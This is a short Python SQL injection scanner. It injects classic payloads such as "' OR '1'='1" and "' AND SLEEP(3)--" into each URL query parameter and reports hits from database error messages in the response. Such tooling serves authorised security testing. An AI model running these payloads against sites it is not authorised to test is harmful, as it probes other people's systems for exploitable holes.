#!/usr/bin/env python3
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = ["'", "' OR '1'='1", "1; SELECT 1--", "' AND SLEEP(3)--"]
ERRORS = ["sql syntax", "mysql_fetch", "ORA-01756", "SQLite", "SQLSTATE"]

class SQLiScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def scan(self):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        if not params:
            return []
        for param in params:
            for payload in PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                try:
                    r = requests.get(test_url, timeout=5)
                    for err in ERRORS:
                        if err.lower() in r.text.lower():
                            print(f"[!] SQLi: {test_url}")
                            self.findings.append({"type": "SQLi", "url": test_url, "param": param})
                            break
                except:
                    pass
        return self.findings
